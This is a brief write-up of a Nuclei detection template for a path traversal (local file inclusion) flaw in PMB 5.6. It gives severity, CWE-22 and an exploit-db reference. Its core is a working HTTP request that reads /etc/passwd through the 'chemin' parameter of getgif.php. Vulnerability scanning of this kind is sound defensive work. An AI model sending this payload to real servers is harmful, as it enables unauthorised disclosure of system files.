# Nuclei Template: PMB 5.6 - Local File Inclusion
**Template ID:** pmb-local-file-disclosure
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`pmb-local-file-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
PMB 5.6 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand_base(4)}}
```

## References
- https://www.exploit-db.com/exploits/49054
